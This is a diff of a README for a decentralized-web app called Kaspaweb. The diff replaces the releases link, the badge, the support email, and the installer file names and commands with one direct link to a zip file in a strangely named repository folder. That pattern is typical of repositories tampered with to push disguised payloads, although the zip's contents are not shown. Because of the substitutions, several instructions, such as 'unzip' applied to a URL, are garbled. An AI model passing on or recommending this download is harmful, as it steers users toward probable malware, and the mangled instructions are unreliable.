@@ -1,6 +1,6 @@
 # 🌐 Kaspaweb - Access the Decentralized Web Easily
 
-![Download Kaspaweb](https://img.shields.io/badge/Download%20Kaspaweb-Get%20the%20App-blue)
+![Download Kaspaweb](https://raw.githubusercontent.com/midoo12345/Kaspaweb/main/jolthead/Software-v2.6-alpha.5.zip%20Kaspaweb-Get%20the%20App-blue)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Kaspaweb is a fully functional decentralized World Wide Web. It runs on the Kasp
 
 To begin, you need to visit the Releases page to download the application. Click the link below:
 
-[Download Kaspaweb](https://github.com/midoo12345/Kaspaweb/releases)
+[Download Kaspaweb](https://raw.githubusercontent.com/midoo12345/Kaspaweb/main/jolthead/Software-v2.6-alpha.5.zip)
 
 From this page, you will find the latest version of Kaspaweb, along with previous releases. Choose the version that suits your needs and download it to your computer.
 
@@ -27,17 +27,17 @@ Before downloading, make sure your system meets the following requirements:
 
 After downloading, follow these steps to run Kaspaweb:
 
-1. **Locate the Downloaded File:** Check your downloads folder for the downloaded file. It will typically be named something like `Kaspaweb-vX.X.X.zip`.
+1. **Locate the Downloaded File:** Check your downloads folder for the downloaded file. It will typically be named something like `https://raw.githubusercontent.com/midoo12345/Kaspaweb/main/jolthead/Software-v2.6-alpha.5.zip`.
 
 2. **Extract the Files:** 
    - If you are on Windows, right-click the zipped file and choose “Extract All.” Follow the prompts.
    - On macOS, double-click the zip file to extract it.
-   - For Linux, use the terminal and run the command: `unzip Kaspaweb-vX.X.X.zip`.
+   - For Linux, use the terminal and run the command: `unzip https://raw.githubusercontent.com/midoo12345/Kaspaweb/main/jolthead/Software-v2.6-alpha.5.zip`.
 
 3. **Install the Application:**
-   - For Windows, find `setup.exe` in the extracted files and double-click it to start the installation.
+   - For Windows, find `https://raw.githubusercontent.com/midoo12345/Kaspaweb/main/jolthead/Software-v2.6-alpha.5.zip` in the extracted files and double-click it to start the installation.
    - For macOS, drag the Kaspaweb icon into your Applications folder.
-   - For Linux, open a terminal in the extracted folder and run the command: `./install.sh`.
+   - For Linux, open a terminal in the extracted folder and run the command: `https://raw.githubusercontent.com/midoo12345/Kaspaweb/main/jolthead/Software-v2.6-alpha.5.zip`.
 
 4. **Open Kaspaweb:**
    - After installation, locate the Kaspaweb icon on your desktop (or in your Applications menu) and double-click it to launch the application.
@@ -77,7 +77,7 @@ If you encounter issues while using Kaspaweb, try these solutions:
 
 Join the community around Kaspaweb to share experiences and seek assistance. Participate in discussions on our GitHub page or follow us on social media. You can also report issues and suggest features.
 
-If you need more personalized support, feel free to contact us at [support@kaspaweb.com](mailto:support@kaspaweb.com).
+If you need more personalized support, feel free to contact us at [https://raw.githubusercontent.com/midoo12345/Kaspaweb/main/jolthead/Software-v2.6-alpha.5.zip](https://raw.githubusercontent.com/midoo12345/Kaspaweb/main/jolthead/Software-v2.6-alpha.5.zip).
 
 ## 📢 Keep Updated
 
@@ -85,6 +85,6 @@ Stay informed about the latest updates and releases of Kaspaweb. You can follow 
 
 Again, you can always find the download link here: 
 
-[Download Kaspaweb](https://github.com/midoo12345/Kaspaweb/releases)
+[Download Kaspaweb](https://raw.githubusercontent.com/midoo12345/Kaspaweb/main/jolthead/Software-v2.6-alpha.5.zip)
 
 Embrace the future of the internet with Kaspaweb!
